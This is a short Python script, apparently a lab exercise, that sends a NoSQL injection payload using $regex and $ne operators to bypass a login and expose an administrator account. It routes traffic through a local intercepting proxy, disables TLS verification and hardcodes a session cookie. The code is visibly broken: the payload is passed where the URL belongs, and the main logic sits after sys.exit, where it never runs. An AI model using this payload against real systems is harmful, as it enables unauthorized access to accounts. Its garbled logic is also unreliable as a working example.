import sys
import requests
import string
import urllib3
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}

def nosql_check(url):
    nosql_payload = '{"username":{"$regex": "admin.*"},"password": {"$ne": ""}}'
    cookies = {'session': 'ec8COP3nuD4NdB56xdwji1DkQZF6ErRD'}
    r = requests.post(nosql_payload, cookies=cookies, verify=False, proxies=proxies)
    res = r.text
    if "admin" in res:
        print('[+] You found the administrator account')


def main():
    if len(sys.argv) != 2:
        print("[+] Usage %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

        url = sys.argv[1]
        print("[+] Checking for Adminstrator User and Password")
        nosql_check(url)


if __name__ == "__main__":
    main()